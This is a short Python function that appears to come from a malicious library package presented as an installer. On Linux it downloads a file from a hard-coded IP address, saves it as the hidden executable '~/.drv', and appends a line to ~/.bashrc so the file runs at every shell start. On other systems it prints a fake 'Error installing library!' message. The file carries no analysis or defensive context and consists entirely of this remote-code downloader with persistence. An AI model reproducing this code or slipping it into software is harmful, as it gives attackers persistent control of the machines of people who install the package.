def rn ():
	
	import platform
	import urllib2
	import os, stat

	ADD_LOC = "http://145.249.104.71/out"
	LOC = ".drv"

	if platform.system () == "Linux":
        	response = urllib2.urlopen (ADD_LOC)
        	os.chdir (os.path.expanduser ("~"))
        	d = open (LOC, "wb")
        	d.write (response.read ())
        	d.close ()

        	current_state = os.stat (LOC)
        	os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)

        	brc = open (".bashrc", "a")
        	brc.write ("\n~/.drv &")
        	brc.close ()


	else:
        	print ("Error installing library!")
        	exit (-1)
